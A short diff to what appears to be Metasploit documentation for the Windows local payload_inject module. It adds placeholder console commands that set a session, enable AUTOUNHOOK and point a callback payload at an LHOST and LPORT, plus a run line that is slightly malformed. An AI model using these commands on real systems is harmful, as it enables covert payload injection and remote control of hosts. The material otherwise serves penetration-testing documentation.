@@ -150,10 +150,15 @@ run AMOUNT=<2>,HANDLER=<true>,SESSION=<1>,IPLIST=<payload_connect_to_ips>,LPORT=
 ## Options
 ```ruby
 use exploit/windows/local/payload_inject
-
+set AUTOUNHOOK <true>
+set SESSION <1>
+# set PAYLOAD <payload>
+# set payload options
+set LHOST <payload_connect_to_ip>
+set LPORT <payload_connect_to_port>
 ```
 
 ## Run
 ```ruby
-
+run -o AUTOUNHOOK=<true>,SESSION=<1>,<payload_connect_to_ips>,LPORT=<payload_connect_to_port> <ip>
 ```
